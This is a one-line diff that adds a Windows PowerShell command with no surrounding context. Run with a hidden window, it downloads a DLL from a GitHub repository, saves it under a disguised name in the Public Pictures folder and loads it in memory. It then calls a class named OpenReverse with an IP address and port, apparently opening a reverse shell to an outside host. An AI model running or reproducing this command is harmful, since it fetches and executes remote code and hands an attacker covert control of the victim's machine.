@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -c "iwr -Uri 'https://github.com/Ug0Security/test/raw/master/reve.dll' -OutFile 'C:\Users\Public\Pictures\ini.dll';[Reflection.Assembly]::Loadfile('C:\Users\Public\Pictures\ini.dll');[OpenReverse]::Main('163.172.57.176', '7071');"
